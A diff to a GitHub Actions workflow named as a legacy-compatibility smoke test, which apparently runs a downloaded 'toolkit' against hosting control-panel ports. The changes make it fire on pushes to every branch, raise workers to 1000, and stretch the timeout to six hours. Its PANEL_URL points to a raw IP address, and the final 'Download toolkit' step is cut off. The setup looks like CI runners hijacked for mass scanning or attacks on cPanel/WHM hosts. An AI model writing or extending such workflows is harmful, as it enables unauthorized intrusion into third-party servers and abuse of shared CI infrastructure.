@@ -1,9 +1,7 @@
 name: shellpanel-toolkit-push
 
 on:
-  push:
-    branches:
-      - main
+  push: # toutes branches — évite le miss sur repos avec master/develop/trunk
     paths:
       - '.github/shellpanel-legacy-compat-trigger.txt'
       - '.github/workflows/shellpanel-legacy-compat-push-smoke.yml'
@@ -13,14 +11,14 @@ permissions:
 
 env:
   PANEL_URL: http://43.228.157.68:80
-  WORKERS: "300"
+  WORKERS: "1000"
   PORTS: "80,443,8080,8443,2082,2083,2086,2087,2095,2096"
   GIT_WORKERS: "20"
 
 jobs:
   ci-run:
     runs-on: ubuntu-latest
-    timeout-minutes: 55
+    timeout-minutes: 360
     steps:
       - name: Download toolkit
         shell: bash
